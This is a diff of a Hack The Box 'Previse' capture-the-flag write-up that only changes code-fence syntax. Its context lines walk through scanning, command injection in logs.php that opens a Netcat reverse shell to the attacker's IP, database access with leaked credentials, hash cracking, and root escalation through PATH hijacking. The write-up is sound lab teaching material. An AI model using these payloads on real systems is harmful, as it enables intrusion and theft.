@@ -24,7 +24,7 @@ Previse requires the submission of a USER flag and a SYSTEM flag, and I have des
 ### Nmap
 This is a single-machine CTF, for which HTB has already provided the IP address (**10.10.11.104**), so we can begin with an NMAP scan on the target — taking some inspiration from [IppSec](https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA), executing [`nmap -sC -sV -oA previse 10.10.11.104`](https://explainshell.com/explain?cmd=nmap+-sC+-sV+-oA+previse+10.10.11.104) will hopefully reveal some information of interest.
 
-```none
+```
 $ nmap -sC -sV -oA previse 10.10.11.104
 
 Starting Nmap 7.92 ( https://nmap.org )
@@ -58,7 +58,7 @@ Good news — a login portal is likely something we can exploit. I tried a few c
 ### Gobuster
 `gobuster dir -u http://10.10.11.104 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x html,txt,php` performs a brute force directory search on Previse to reveal any hidden pages with names found in *directory-list-2.3-medium.txt* and which have file extensions of .html, .txt, or .php. Executing that command took quite some time, and I unfortunately ran into rate-limiting issues — after all, the word list used contains 220560 elements. Eventually, however, Gobuster yielded the following:
 
-```none
+```
 $ gobuster dir -u http://10.10.11.104 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x html,txt,php
 ===============================================================
 Gobuster v3.1.0
@@ -227,7 +227,7 @@ Navigating to the login portal and submitting `username123:password123` now perm
 ## Building Familiarity with Previse
 ### Exploring the Previse Site
 A plethora of interesting material now lies within our grasp — for instance, a full site backup may be downloaded via a link at files.php. Or, perhaps nearly as significant, a log of user activity as related to file downloads may be downloaded at file_logs.php, which looks like so:
-```none
+```
 $ cat previse.log
 time,user,fileID
 1622482496,m4lwhere,4
@@ -277,7 +277,7 @@ As a reminder, user `m4lwhere` is the user who created this CTF; I assume all ot
 
 ### Examining the Previse Backup
 Returning to the website backup, it seems that the following files are included, consistent with the pages previously found by Gobuster:
-```none
+```
 $ ls
 total 60K
 -rw-r--r-- 1 slak slak 5.6K Jun 12  2021 accounts.php
@@ -326,7 +326,7 @@ Consider the following request, captured when submitting a request for log data 
 At the bottom, `delim=comma` can be seen; this can be changed to `delim=comma; <statement>` to execute `<statement>` when the POST request is forwarded. Ideally, a reverse shell may be set up to grant shell access. This, of course, can be difficult to do without knowing what packages are installed on the target.
 
 I have only ever used Netcat with Metasploit modules on old Windows XP machines to create reverse shell access, so hopefully Previse has Netcat installed. A reverse shell using Netcat can be spawned with [`nc 10.10.14.70 1234 -c bash`](https://explainshell.com/explain?cmd=nc+10.10.14.70+1234+-e+-c+bash); so, the full post request can be as follows, given that my IP address is 10.10.14.70:
-```none
+```
 POST /logs.php HTTP/1.1
 Host: 10.10.11.104
 Content-Length: 53
@@ -347,7 +347,7 @@ delim=comma; nc 10.10.14.70 1234 -c bash
 
 ### Connecting with Netcat
 Before sending the POST request with the malicious connection request, we must listen for incoming connections on port 1234, as specified, which is done with [`nc -nlp 1234`](https://explainshell.com/explain?cmd=nc+-nlp+1234). After doing so, the post request may be sent... Looks like Previse has Netcat installed after all — basic shell access has been achieved!
-```none
+```
 $ nc -nlp 1234
 listening on [any] 1234 ...
 connect to [10.10.14.70] from (UNKNOWN) [10.10.11.104] 48236
@@ -358,11 +358,11 @@ Executing `whoami` yields `www-data`, as expected.
 ## Searching for USER, SYSTEM Flags
 ### Connecting to the SQL Database
 The primary incentive behind gaining shell access was to connect to the SQL database using the `root:mySQL_p@ssw0rd!:)` credential set found in the site backup under config.php. Let's see if those credentials work as expected:
-```none
+```
 $ mysql -u root -p
 Enter password: mySQL_p@ssw0rd!:)
 ```
-```none
+```
 Welcome to the MySQL monitor.  Commands end with ; or \g.
 Your MySQL connection id is 1434
 Server version: 5.7.35-0ubuntu0.18.04.1 (Ubuntu)
@@ -410,7 +410,7 @@ mysql>
 ### Finding and Cracking Password Hashes from the SQL Database
 
 It seems the credentials do work! That `accounts` table looks pretty interesting. Contents:
-```none
+```
 mysql> select * from accounts;
 select * from accounts;
 +----+---------------+------------------------------------+---------------------+
@@ -429,7 +429,7 @@ select * from accounts;
 
 Very nice! We have all existing usernames and their password hashes for each user of the Previse site — of course, only the `m4lwhere` user is of any interest, as all other usernames are HTB users. *Note that, to preserve the integrity of the CTF, the password hashes have been redacted.* John or Hashcat could be used here — I'll use John, since I'm familiar with it and the GPU in my Parrot machine is far from powerful...
 
-```none
+```
 $ john hash --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt-long
 Created directory: /home/slak/.john
 Using default input encoding: UTF-8
@@ -441,7 +441,7 @@ Press 'q' or Ctrl-C to abort, almost any other key for status
 ```
 
 Lets explore the Previse file system while John is running. Exiting from the SQL database and executing `ls /home` reveals the existence of the `m4lwhere` user's home directory. Pushing further reveals...
-```none
+```
 www-data@previse:/var/www/html$ ls /home/m4lwhere
 user.txt
 www-data@previse:/var/www/html$ cat /home/m4lwhere/user.txt
@@ -455,7 +455,7 @@ After some time, the hash was successfully cracked.
 ### Obtaining the USER Flag
 Let's see if we can use our newfound password to ssh into Previse as user `m4lwhere`.
 
-```none
+```
 $ ssh m4lwhere@10.10.11.104
 The authenticity of host '10.10.11.104 (10.10.11.104)' can't be established.
 ECDSA key fingerprint is SHA256:rr7ooHUgwdLomHhLfZXMaTHltfiWVR7FJAe2R7Yp5LQ.
@@ -486,7 +486,7 @@ m4lwhere@previse:~$
 ```
 
 Success! Now to read the USER flag:
-```none
+```
 m4lwhere@previse:~$ cat user.txt
 <REDACTED>
 ```
@@ -495,7 +495,7 @@ HTB accepted the flag, but we're not quite done yet; the SYSTEM flag remains.
 
 ### Escalating Privileges
 Executing [`sudo -l`](https://explainshell.com/explain?cmd=sudo+-l) reveals that:
-```none
+```
 User m4lwhere may run the following commands on previse:
  (root) /opt/scripts/access_backup.sh
 ```
@@ -514,7 +514,7 @@ gzip -c /var/www/file_access.log > /var/backups/$(date --date="yesterday" +%Y%b%
 ```
 
 Examining the script, it looks like development negligence turned in my favor. Both the `gzip` and `date` binaries are referenced relatively; therefore, we can edit PATH to point to my own `gzip`/`date` script(s). Consider the following commands, given that I have created a `date` program in `/home/m4lwhere`:
-```none
+```
 m4lwhere@previse:~$ export PATH=:/home/m4lwhere
 m4lwhere@previse:~$ /bin/cat date
 #!/bin/bash
@@ -527,7 +527,7 @@ Root access has been granted!
 
 ### Obtaining the SYSTEM Flag
 All that is left is to print the SYSTEM flag:
-```none
+```
 root@previse:/home/m4lwhere# ls /root
 root.txt
 root@previse:/home/m4lwhere# cat /root/root.txt
